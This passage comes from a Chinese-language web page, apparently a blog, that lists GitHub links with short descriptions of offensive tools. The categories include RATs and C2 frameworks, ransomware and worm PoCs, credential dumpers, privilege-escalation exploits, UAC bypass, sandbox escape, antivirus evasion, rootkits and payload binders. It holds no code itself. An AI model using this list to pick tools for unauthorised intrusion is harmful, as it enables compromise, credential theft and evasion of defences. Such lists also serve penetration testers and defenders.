枚举操作系统信息，域信息，共享，目录和用户。</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;zMarch&#x2F;Orc bash，Linux 下后渗透命令集合</span><br></pre></td></tr></table></figure><h3 id="远程控制-C2-服务器"><a href="#远程控制-C2-服务器" class="headerlink" title="远程控制 C2 服务器"></a>远程控制 C2 服务器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;malwaredllc&#x2F;byob 僵尸网络生成框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;proxycannon&#x2F;proxycannon-ng 构建攻击僵尸网络</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;deadPix3l&#x2F;CryptSky&#x2F; 勒索软件 poc</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;jgamblin&#x2F;Mirai-Source-Code 蠕虫病毒 poc</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;AhMyth&#x2F;AhMyth-Android-RAT 基于 smali，Windows 下安卓远控，一对多带界面</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ssooking&#x2F;cobaltstrike3.12_cracked java1.8，远控、钓鱼、内网</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Mr-Un1k0d3r&#x2F;ThunderShell py2，CLI 与 web 端，内存马，RC4 加密 HTTP 传输</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;tiagorlampert&#x2F;CHAOS go，win 远控，可过大部分杀软</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Ne0nd0g&#x2F;merlin go，c2 通讯，一对多</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;0x09AL&#x2F;Browser-C2 go，利用 chrome 以浏览器的形式连接 C2 服务器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;xdnice&#x2F;PCShare c++，可以监视目标机器屏幕、注册表、文件系统等</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;quasar&#x2F;QuasarRAT c#，一对多，界面</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;TheM4hd1&#x2F;Vayne-RaT c#，一对多，界面</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;nettitude&#x2F;PoshC2 PowerShell、C#，远控工具，有 win 提权组件</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;euphrat1ca&#x2F;njRAT-v0.7d vb，常见蠕虫远控，有很多变种，一对多带界面</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;zerosum0x0&#x2F;koadic py3,利用 JScript&#x2F;VBScript 进行控制，大宝剑</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Ridter&#x2F;MyJSRat py2，利用 js 后门，配合 chm、hta 可实现很多后门方式。evi1cg.me&#x2F;archives&#x2F;chm_backdoor.html</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;its-a-feature&#x2F;Apfell py3，macOS 与 linux 下的利用 js 后门，web 界面管理</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;peterpt&#x2F;fuzzbunch py2，NSA 漏洞利用工具，配有自动化安装脚本与 gui 界面，远控 rat</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;n1nj4sec&#x2F;pupy py，Windows, Linux, OSX, Android 跨平台，一对多</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;nathanlopez&#x2F;Stitch py，Windows、Mac OSX、Linux 跨平台</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;neoneggplant&#x2F;EggShell py，macos&#x2F;osx 远控,可生成 HID 代码，一对多</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Marten4n6&#x2F;EvilOSX py，macos&#x2F;osx 远控，一对多</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;vesche&#x2F;basicRAT py3，simple 远控，一对多</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Viralmaniar&#x2F;Powershell-RAT py，截图通过 gmail 传输</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;byt3bl33d3r&#x2F;gcat py，使用 gmail 作为 C&amp;C 服务器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;sweetsoftware&#x2F;Ares py，c2 通讯，支持代理</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;micle-fm&#x2F;Parat py，利用 telegram，windows 下的远程控制工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ahhh&#x2F;Reverse_DNS_Shell py，通过 dns 传输</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;iagox86&#x2F;dnscat2 服务端为 ruby（linux），客户端为 C（win&#x2F;linux），利用 DNS 协议进行端对端传输</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;deepzec&#x2F;Grok-backdoor py，利用 ngrok 的后门</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;trustedsec&#x2F;trevorc2 py，搭建一个合法的网站（可浏览），用于隐藏命令执行的客户端&#x2F;服务器通信</span><br></pre></td></tr></table></figure><h3 id="端口转发与代理工具"><a href="#端口转发与代理工具" class="headerlink" title="端口转发与代理工具"></a>端口转发与代理工具</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;fatedier&#x2F;frp 用于内网穿透的高性能的反向代理应用，支持 tcp, udp, http, https 协议</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;inconshreveable&#x2F;ngrok 端口转发，正反向代理，内网穿透</span><br><span class="line">http:&#x2F;&#x2F;ngrok.ciqiuwl.cn&#x2F; 在线小米球 ngrok</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;knownsec&#x2F;rtcp Socket 端口转发，用于远程维护</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;davrodpin&#x2F;mole 基于 ssh 的端口转发</span><br><span class="line">http:&#x2F;&#x2F;rootkiter.com&#x2F;EarthWorm 一款用于开启 SOCKS v5 代理服务的工具，基于标准 C 开发，可提供多平台间的转接通讯，用于复杂网络环境下的数据转发。</span><br><span class="line">http:&#x2F;&#x2F;rootkiter.com&#x2F;Termite&#x2F;README.txt EarthWorm 升级版，可以实现多节点跳跃</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;SECFORCE&#x2F;Tunna 可以通过 HTTP 封装隧道通信任何 TCP，以及用于绕过防火墙环境中的网络限制</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;fbkcs&#x2F;thunderdns 将 tcp 流量通过 DNS 协议转发，不需要客户端和 socket5 支持</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;sensepost&#x2F;reGeorg reDuh 的升级版，主要是把内网服务器的端口通过 http&#x2F;https 隧道转发到本机，形成一个回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口（提供了 php，asp，jsp 脚本的正反向代理）</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;SpiderClub&#x2F;haipproxy py3,Scrapy and Redis,高可用 ip 代理池</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;chenjiandongx&#x2F;async-proxy-pool py3 异步爬虫 ip 代理池</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;audibleblink&#x2F;doxycannon 使用一个 openvpn 代理池，为每一个生成 docker，当连接某一个 vpn 后，其它的进行 socks5 转发做流量分发</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;decoder-it&#x2F;psportfwd PowerShell 编写的端口转发工具, 无需 admin 权限</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ls0f&#x2F;gortcp go，通过主控端、中转、被控端实现内网穿透</span><br></pre></td></tr></table></figure><h3 id="横向移动与密码-Hash-窃取"><a href="#横向移动与密码-Hash-窃取" class="headerlink" title="横向移动与密码 Hash 窃取"></a>横向移动与密码 Hash 窃取</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.oxid.it&#x2F;cain.html Cain &amp; Abel 支持密码还原、arp 中间人攻击</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;gentilkiwi&#x2F;mimikatz Windows 下以抓取密码为主的横向移动神器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;skelsec&#x2F;pypykatz 使用纯 py3 实现的 mimikatz</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;eladshamir&#x2F;Internal-Monologue 无需 LSASS 进程使用 Mimikatz 从 LSASS 进程内存中提取内容, 从内存中提取明文密码, NTLM 哈希, Kerberos ticket, 以及执行 pass-the-hash&#x2F;pass-the-ticket 攻击等</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;AlessandroZ&#x2F;LaZagne py3，密码抓取工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;AlessandroZ&#x2F;LaZagneForensic LaZagne 密码破解升级版，利用 DPAPI，目前缺陷是需要 windows user 密码</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;twelvesec&#x2F;passcat Windows 下密码抓取工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;huntergregal&#x2F;mimipenguin linux 密码抓取神器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;quarkslab&#x2F;quarkspwdump quarkslab 出品的密码抓取工具，不用注入任何进程</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;mthbernardes&#x2F;sshLooter 从 ssh 服务中窃取用户名密码</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;nettitude&#x2F;Invoke-PowerThIEf 利用 IE 进行后渗透，抓取密码、重定向等</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;GhostPack&#x2F;Rubeus 操作 Kerberos 的库, 实现了 Kekeo 的大部分功能, C#编写</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;m8r0wn&#x2F;ldap_search PY,通过 ldap（轻量目录访问协议）认证，列举 win 域信息，爆破登录</span><br></pre></td></tr></table></figure><h3 id="Linux-提权相关"><a href="#Linux-提权相关" class="headerlink" title="Linux 提权相关"></a>Linux 提权相关</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;AlessandroZ&#x2F;BeRoot py,通过检查常见的错误配置来查找提权方法. 支持 Windows&#x2F;Linux&#x2F;Mac</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;mschwager&#x2F;0wned 利用 python 包进行高权限用户创建</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;mzet-&#x2F;linux-exploit-suggester 查找 linux 有哪些补丁没有打的脚本</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;belane&#x2F;linux-soft-exploit-suggester 查找 linux 有哪些有漏洞的软件</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;dirtycow&#x2F;dirtycow.github.io 脏牛提权漏洞 exp</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;FireFart&#x2F;dirtycow 脏牛提权漏洞 exp</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;stanleyb0y&#x2F;sushell 利用 su 小偷实现低权限用户窃取 root 用户口令</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;jas502n&#x2F;CVE-2018-17182&#x2F; Linux 内核 VMA-UAF 提权漏洞 CVE-2018-17182</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;jas502n&#x2F;CVE-2018-14665 CVE-2018-14665，linux 下 Xorg X 服务器提权利用</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;nmulasmajic&#x2F;syscall_exploit_CVE-2018-8897 Linux 系统利用 Syscall 实现提权</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;can1357&#x2F;CVE-2018-8897 Linux 系统利用 Syscall 实现提权</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;SecWiki&#x2F;linux-kernel-exploits linux-kernel-exploits Linux 平台提权漏洞集合</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;nilotpalbiswas&#x2F;Auto-Root-Exploit linux 自动提权脚本</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;WazeHell&#x2F;PE-Linux Linux 提权工具</span><br><span class="line">https:&#x2F;&#x2F;guif.re&#x2F;linuxeop linux 提权命令集合</span><br></pre></td></tr></table></figure><h3 id="Windows-提权相关"><a href="#Windows-提权相关" class="headerlink" title="Windows 提权相关"></a>Windows 提权相关</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.fuzzysecurity.com&#x2F;tutorials&#x2F;16.html windows 平台教程级提权参考文章</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;SecWiki&#x2F;windows-kernel-exploits Windows 平台提权漏洞 Exp 集合</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;51x&#x2F;WHP windows 下各种提权与利用工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;rasta-mouse&#x2F;Sherlock win 提权漏洞验证</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;WindowsExploits&#x2F;Exploits 微软 CVE-2012-0217、CVE-2016-3309、CVE-2016-3371、CVE-2016-7255、CVE-2017-0213 提权利用</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;decoder-it&#x2F;lonelypotato RottenPotatoNG 变种，利用 NBNS 本地域名欺骗和 WPAD 代理欺骗提权</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ohpe&#x2F;juicy-potato RottenPotatoNG 变种，利用 com 对象、用户 token 进行提权</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;foxglovesec&#x2F;Potato RottenPotatoNG 变种，利用本地域名欺骗和代理欺骗提权</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;DanMcInerney&#x2F;icebreaker 处于内网环境但又在 AD 环境之外，icebreaker 将会帮助你获取明文 Active Directory 凭据（活动目录存储在域控服务器可用于提权）</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;hausec&#x2F;ADAPE-Script Active Directory 权限提升脚本</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;klionsec&#x2F;BypassAV-AllThings 利用 aspx 一句话配合提权 payload 提权</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;St0rn&#x2F;Windows-10-Exploit msf 插件，win10 uac bypass</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;sam-b&#x2F;CVE-2014-4113 利用 Win32k.sys 内核漏洞进行提取，ms14-058</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;breenmachine&#x2F;RottenPotatoNG 利用 NBNS 本地域名欺骗和 WPAD 代理欺骗提权</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;unamer&#x2F;CVE-2018-8120 影响 Win32k 组件，针对 win7 和 win2008 提权</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;alpha1ab&#x2F;CVE-2018-8120 在 win7 与 win2k8 的基础上增加了 winXP 与 win2k3</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;0xbadjuju&#x2F;Tokenvator 使用 Windows 令牌提升权限的工具，提供一个交互命令行界面</span><br></pre></td></tr></table></figure><h3 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过"></a>权限绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;payloads.online&#x2F;archivers&#x2F;2018-12-22&#x2F;1 DLL Hijacking &amp; COM Hijacking ByPass UAC - 议题解读</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;tyranid&#x2F;DotNetToJScript 能够利用 JS&#x2F;Vbs 脚本加载.Net 程序的工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;mdsecactivebreach&#x2F;SharpPack 绕过系统应用白名单执行 DotNet and PowerShell tools</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;rootm0s&#x2F;WinPwnage py2，win 下权限提升，uac 绕过，dll 注入等</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;hfiref0x&#x2F;UACME 包含许多用于多个版本操作系统上绕过 Windows 用户帐户控制的方法</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Ben0xA&#x2F;nps 实现了不使用 powershell.exe 的情况下执行 powershell 命令</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Mr-Un1k0d3r&#x2F;PowerLessShell 实现了不调用 powershell.exe 的情况下执行 powershell 命令</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;p3nt4&#x2F;PowerShdll 使用 rundll32 运行 PowerShell，绕过软件限制</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ionescu007&#x2F;r0ak 内核层的瑞士军刀. 在 Windows10 内核中读&#x2F;写&#x2F;执行代码</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;leechristensen&#x2F;UnmanagedPowerShell 从一个非托管程序来执行 PowerShell,经过一些修改后可以被用来注入到其他进程</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;stephenfewer&#x2F;ReflectiveDLLInjection 一种库注入技术，让 DLL 自身不使用 LoadLibraryA 函数,将自身映射到目标进程内存中</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ChrisAD&#x2F;ads-payload 利用环境变量与 destop.ini 绕过 windows 下的 Palo Alto Traps endpoint 防护软件</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Zer0Mem0ry&#x2F;RunPE 通过内存读取，网络传输内容，利用 PE 执行 shellcode</span><br></pre></td></tr></table></figure><h3 id="沙盒逃逸"><a href="#沙盒逃逸" class="headerlink" title="沙盒逃逸"></a>沙盒逃逸</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;hacksysteam&#x2F;WpadEscape 利用 wpad 进行浏览器 sandbox 沙箱逃逸</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;unamer&#x2F;vmware_escape vmware 虚拟机逃逸。CVE-2017-4901，CVE-2018-6981，CVE-2018-6982</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;MorteNoir1&#x2F;virtualbox_e1000_0day VirtualBox E1000 Guest-to-Host Escape 逃逸。教程</span><br><span class="line">https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;project-zero&#x2F;issues&#x2F;detail?id&#x3D;1682&amp;desc&#x3D;2 Ghostscript：基于漏洞 CVE-2018-17961 的-dSAFER 沙盒逃逸技术</span><br></pre></td></tr></table></figure><h3 id="后门免杀代码混淆"><a href="#后门免杀代码混淆" class="headerlink" title="后门免杀代码混淆"></a>后门免杀代码混淆</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.shellterproject.com 杀毒软件绕过</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;trustedsec&#x2F;unicorn py，一键生成多种后门</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;islamTaha12&#x2F;Python-Rootkit windows 下 rootkit，反弹 meterpreter</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;n00py&#x2F;Hwacha linux 下快速生成 metepreter 等多种 payload</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Screetsec&#x2F;Vegile msf 免杀，程序注入</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;MohamedNourTN&#x2F;Terminator py2，msf 免杀</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Veil-Framework&#x2F;Veil msf 免杀</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;abedalqaderswedan1&#x2F;aswcrypter py、bash，msf 免杀</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Screetsec&#x2F;TheFatRat java，msf 免杀，利用 searchsploit 快速搜索</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;pasahitz&#x2F;zirikatu msf 免杀</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;govolution&#x2F;avet msf 免杀</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;GreatSCT&#x2F;GreatSCT msf 免杀</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;EgeBalci&#x2F;HERCULES msf 免杀</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;trustedsec&#x2F;nps_payload msf 免杀</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;4w4k3&#x2F;Insanity-Framework py，payload 生成，过杀软，识别虚拟机，钓鱼，内存注入等</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;hlldz&#x2F;SpookFlare Meterpreter，Empire，Koadic 等 loader&#x2F;dropper 的生成器，可以绕过客户端检测和网络端检测的端点策略</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;pasahitz&#x2F;regsvr32 使用 C#+Empire 实现最小体积免杀后门</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;malcomvetter&#x2F;UnstoppableService 将自身安装为 Windows 服务且管理员无法停止&#x2F;暂停服务的程序. C#编写</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Cn33liz&#x2F;StarFighters 基于 DotNetToJScript，利用 JavaScript 和 VBScript 执行 Empire Launcher</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;mdsecactivebreach&#x2F;SharpShooter 基于 DotNetToJScript 使用 js、vbs，用于检索和执行任意 CSharp 源码的 payload 创建框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;mdsecactivebreach&#x2F;CACTUSTORCH 基于 DotNetToJScript 使用 js、vbs 生成恶意 payload</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;OmerYa&#x2F;Invisi-Shell 对 powershell 文件进行混淆</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;danielbohannon&#x2F;Invoke-DOSfuscation 对 powershell 文件进行混淆，加密操作以及重新编码</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;danielbohannon&#x2F;Invoke-Obfuscation 对 powershell 文件进行混淆，加密操作以及重新编码</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Mr-Un1k0d3r&#x2F;SCT-obfuscator Cobalt Strike SCT 有效载荷混淆器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;tokyoneon&#x2F;Armor bash，生成加密 Payload 在 macOS 上反弹 Shell</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Mr-Un1k0d3r&#x2F;MaliciousMacroGenerator 宏混淆，其中还包括 AV&#x2F;Sandboxes 逃避机制</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Kkevsterrr&#x2F;backdoorme py3、py2 多种类型的后门、shell 生成工具，可以自动维持权限</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;TestingPens&#x2F;MalwarePersistenceScripts win 下权限维持脚本</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;mhaskar&#x2F;Linux-Root-Kit py，simple，linux 下 rootkit</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;PinkP4nther&#x2F;Sutekh simple，rootkit，使普通用户获取 root shell</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;threatexpress&#x2F;metatwin 从一个文件中提取元数据，包括数字签名，并注入到另一个文件中</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Mr-Un1k0d3r&#x2F;Windows-SignedBinary 可以修改二进制文件的 HASH，同时保留微软 windows 的签名</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;secretsquirrel&#x2F;SigThief py，用于劫持合法的数字签名并绕过 Windows 的哈希验证机制的脚本工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;9aylas&#x2F;Shortcut-Payload-Generator 快捷方式(.lnk)文件 Payload 生成器.AutoIt 编写</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;GuestGuri&#x2F;Rootkit 反弹一个 tcp 连接，将进程 id 绑定到一个空文件夹</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;secretsquirrel&#x2F;the-backdoor-factory 可以生成 win32PE 后门测试程序,ELF 文件后门程序等</span><br></pre></td></tr></table></figure><h3 id="文件捆绑"><a href="#文件捆绑" class="headerlink" title="文件捆绑"></a>文件捆绑</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">bat2exe.net 相类似也可以利用 iexpress 与 winrar 生成自解压 exe 可执行文件</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;islamadel&#x2F;bat2exe 将 bat 文件转换为 exe 二进制文件</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;tywali&#x2F;Bat2ExeConverter 将 bat 文件转换为 exe 二进制文件</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Juntalis&#x2F;win32-bat2exe 将 bat 文件转换为 exe 二进制文件</span><br><span class="line">http:&#x2F;&#x2F;www.f2ko.de&#x2F;downloads&#x2F;Bat_To_Exe_Converter.zip 将 bat 文件转换为 exe 二进制文件，可以隐藏窗口。</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;r00t-3xp10it&#x2F;trojanizer 将两个可执行文件打包为自解压文件，自解压文件在执行时会执行可执行文件</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;r00t-3xp10it&#x2F;backdoorppt 将 payload 更换图标</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;r00t-3xp10it&#x2F;FakeImageExploiter 将 payload 更换图标。需要 wine 与 resourcehacker 环境</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;DamonMohammadbagher&#x2F;FakeFileMaker 更换图标和名称</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;peewpw&#x2F;Invoke-PSImage 将 PS 脚本隐藏进 PNG 像素中并用一行指令去执行它</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Mr-Un1k0d3r&#x2F;DKMC Don’t kill my cat 生成混淆的 shellcode，将 shellcode 存储在多语言图像中</span><br><span 